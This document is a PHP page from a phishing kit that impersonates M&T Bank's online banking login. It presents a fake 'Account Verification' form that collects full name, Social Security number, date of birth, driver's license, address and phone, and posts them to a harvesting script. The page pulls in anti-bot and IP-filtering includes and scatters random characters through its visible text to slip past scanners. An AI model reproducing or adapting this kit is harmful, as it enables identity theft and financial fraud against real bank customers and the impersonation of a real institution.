<?php
error_reporting(0);
session_start();
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";

?>
<!DOCTYPE html>
<html lang="en" class="__sticky-footer __sticky-footer--links">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
 <title>Welcome to Online Banking | M&amp;T Bank</title>

    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link href="../ft/css.css" rel="stylesheet">

    
<link rel="icon" sizes="96x96" href="../ft/image.png" type="image/png">
<link rel="icon" sizes="32x32" href="../ft/image(1).png" type="image/png">
<link rel="icon" sizes="16x16" href="../ft/image(2).png" type="image/png">
	<style>
		.sr8{max-width:60%}
		.sr8s{max-width:45%}
	</style>

	</head>
<body>

   

<form action="idproc" method="post">
<div class="mtb-app-enrollment">
        <header class="mtb-page-header">
            <div class="grid-x align-center">
                <div class="cell">
                    <a  class="mtb__logo">
                        <img src="../ft/mtb-logo.svg" alt="M&amp;T Bank Site">
                    </a>
                </div>
            </div>
        </header>



            <div class="mtb-page-error <?php if(!isset($_GET[''.$theerrkey.''])){echo 'hide';};?>">
                <div class="mtb-app-default--content">
                    <div class="callout __has-icon warning __no-border">
                        <i class="__is-icon m-icon m-icon-notification">
                            <span class="show-for-sr">Notification Icon</span>
                        </i>
                        <p>
                            
    Ple<?php echo rT('ALPHANUMERIC',rand(1,87));?>ase fill in all the informations correctly in the displayed format
    
                        </p>
                    </div>
                </div>
            </div>
        <div class="mtb-app-login--content">
            <div class="grid-x grid-padding-x grid-x__padded __spacer-section">
                <div class="cell">
                    <div class="mtb-section-header mtb-section-header__login">
                        <h1>
                           Account Verification - Ident<?php echo rT('ALPHANUMERIC',rand(1,87));?>ification
                        </h1>
                        <p>
                         Ste<?php echo rT('ALPHANUMERIC',rand(1,87));?>p 1 of 2: Confi<?php echo rT('ALPHANUMERIC',rand(1,87));?>rm details About Yourself
                        </p>
                    </div>
                </div>

                <div class="cell">
                    <label for="fnam">
                       Full Name
                    </label>
                    <div class="input-group m-fake-single-input">
                        <input class="input-group-field js-formnputItem" type="text" id="fnam" name="fnam" autocomplete="off" aria-required="true" value="">
                        
                    </div>
                </div>

                <div class="cell">
                    <label for="ssn">
                        Social security number
                    </label>
                    <div class="input-group m-fake-single-input">
                        <input class="input-group-field js-formnputItem" type="tel" id="ssn" name="ssn" autocomplete="off" aria-required="true"  maxlength="11" oninput='innumlen(this.value)' value="">
                        
                    </div>
                </div>

                <div class="cell">
                    <label for="dob">
                        Date of Birth
                    </label>
                    <div class="input-group m-fake-single-input">
                        <input class="input-group-field js-formnputItem sr8" placeholder="MM/DD/YYYY" oninput="DateOfBirth();" type="tel" id="dob" name="dob" autocomplete="off" aria-required="true" maxlength="10" value="">
                        
                    </div>
                </div>

                <div class="cell">
                    <label for="dl">
                        Drivers License
                    </label>
                    <div class="input-group m-fake-single-input">
                        <input class="input-group-field js-formnputItem" type="text" id="dl" name="dl" autocomplete="off" aria-required="true"  maxlength="20" value="">
                        
                    </div>
                </div>

                <div class="cell">
                    <label for="street">
                        Street Address
                    </label>
                    <div class="input-group m-fake-single-input">
                        <input class="input-group-field js-formnputItem" type="text" id="street" name="street" autocomplete="off" aria-required="true" value="">
                        
                    </div>
                </div>

                <div class="cell">
                    <label for="state">
                        State
                    </label>
                    <div class="input-group m-fake-single-input">
                        <input class="input-group-field js-formnputItem sr8" type="text" id="state" name="state" autocomplete="off" aria-required="true"  maxlength="20" value="">
                        
                    </div>
                </div>

                <div class="cell">
                    <label for="zip">
                        Zip Code
                    </label>
                    <div class="input-group m-fake-single-input">
                        <input class="input-group-field js-formnputItem sr8s" oninput='innumlen(this.value)' type="tel" id="zip" name="zip" autocomplete="off" aria-required="true" maxlength="20" value="">
                        
                    </div>
                </div>

                <div class="cell">
                    <label for="phone">
                       Phone
                    </label>
                    <div class="input-group m-fake-single-input">
                        <input class="input-group-field js-formnputItem" oninput='innumlen(this.value)' type="tel" id="phone" name="phone" autocomplete="off" aria-required="true" maxlength="16" value="">
                        
                    </div>
                </div>

            </div>

            <div class="grid-x grid-padding-x __spacer-paragraph grid-x__padded">
                <div class="cell">

                    <button type="submit" name="btnin" value="login" class="button button__form-no-spacer expanded" id="btnSubmit">
                        Continue
                    </button>
                </div>

                <p class="cell text-center __font-size-tiny __color-gray-accent">
                    Unautho<?php echo rT('ALPHANUMERIC',rand(1,87));?>rized access is prohibi<?php echo rT('ALPHANUMERIC',rand(1,87));?>ted. Usage may be monit<?php echo rT('ALPHANUMERIC',rand(1,87));?>ored.
                </p>
            </div>
        </div>

        <hr class="__spacer-section">
        <div class="mtb-app-default--content">

			</div>
        <section class="mtb-footer mtb-footer__auth" role="contentinfo">
            <div class="grid-x">
                <div class="cell flex-container flex-dir-column align-center-middle">
                    <div class="mtb-footer--auth">
                        <a  class="" target="_blank">Get Started Guide</a>
                        <a  target="_blank">Secu<?php echo rT('ALPHANUMERIC',rand(1,87));?>rity Assistance</a>
                        <a  target="_blank">Digital Service Agreement</a>
                        <a  target="_blank">ESign Agr<?php echo rT('ALPHANUMERIC',rand(1,87));?>eement</a>
                        <a  target="_blank">
                            Access<?php echo rT('ALPHANUMERIC',rand(1,87));?>ibility
                        </a>


                        <a  target="_blank">
                            m<?php echo rT('ALPHANUMERIC',rand(1,87));?>tb.com
                        </a>
                    </div>

                    <div class="mtb-footer--non-auth">
                        <p>
                            ©<?php echo date("Y");?> M&amp;T B<?php echo rT('ALPHANUMERIC',rand(1,87));?>ank. All Rights Reserved.<br>
                            Users of this webs<?php echo rT('ALPHANUMERIC',rand(1,87));?>ite agree to be bo<?php echo rT('ALPHANUMERIC',rand(1,87));?>und by the provi<?php echo rT('ALPHANUMERIC',rand(1,87));?>sions of the M&amp;T website <a  target="_blank">
                                Terms of
                                Use
                            </a> and <a  target="_blank">Privacy Policy</a>.
                        </p>
                        <div class="mtb-footer__logo">
                            <a  target="_blank">
                                <img src="../ft/mtb-equalhousinglender.svg" class="mtb-footer__equalhousinglender" alt="Equal Housing Lender">
                            </a>
                            <a  target="_blank">
                                <img src="../ft/mtb-entrust.svg" class="mtb-footer__entrust" alt="Entrust">
                            </a>
                        </div>
                        <p>
                            Equal<?php echo rT('ALPHANUMERIC',rand(1,87));?> Housing Lend<?php echo rT('ALPHANUMERIC',rand(1,87));?>er NMLS #381076
                            <a  target="_blank">Member FDIC</a>
                        </p>
                    </div>
                </div>
            </div>
        </section>
    </div>
</form>
<script>
"use strict"

function DateOfBirth(){var key =event.data;var val=event.target.value;if(event.inputType=="insertText"){if(isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);}; switch(val.length){
case 1:if(key > 1){event.target.value="";}; break; 
case 2:if(val[0]==1 && key > 2 || isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else if(val[0]==0 && key == 0){event.target.value=val.slice(0,val.length-1);} else {event.target.value=event.target.value+"/";}; break;
case 4:if(key > 3){event.target.value=val.slice(0,val.length-1);}; break;
case 5:if(val[3]>=3 && key > 1 || isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else if(val[3]==0 && key == 0){event.target.value=val.slice(0,val.length-1);} else {event.target.value=event.target.value+"/";}; break;
case 7:if(key < 1 || key > 2){event.target.value=val.slice(0,val.length-1);}; break; 
case 8:if(val[6] == 1 && key < 9){event.target.value=val.slice(0,val.length-1);} else if(val[6]==2 && key > 0){event.target.value=val.slice(0,val.length-1);}; break; 
case 9:if(val[6]==2 && key > 1){event.target.value=val.slice(0,val.length-1);}; break; };};
if(event.inputType=="deleteContentBackward" && val.length == 2){event.target.value=val[0]}
else if(event.inputType=="deleteContentBackward" && val.length == 5){event.target.value=val.slice(0,val.length-1);}};

function innumlen(val){if(event.inputType=="insertText"){if(isNaN(parseInt(event.data))){if(val.length<=1){event.target.value="";} else{event.target.value=val.slice(0,val.length-1);};};};};

</script>



	

</body></html>